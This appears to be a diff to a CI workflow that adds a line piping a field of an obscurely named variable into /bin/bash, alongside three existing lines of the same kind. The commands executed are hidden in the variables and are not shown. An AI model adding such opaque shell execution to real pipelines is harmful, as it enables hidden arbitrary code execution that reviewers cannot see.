@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$sdorr793" | jq -r .wdr5 | /bin/bash
           echo $z2 | jq -r .rou182 | /bin/bash
           echo $sbp6 | jq -r .bvwii047 | /bin/bash
+          echo $u87895 | jq -r .uy503 | /bin/bash
 
       - name: Archive results
         if: always()
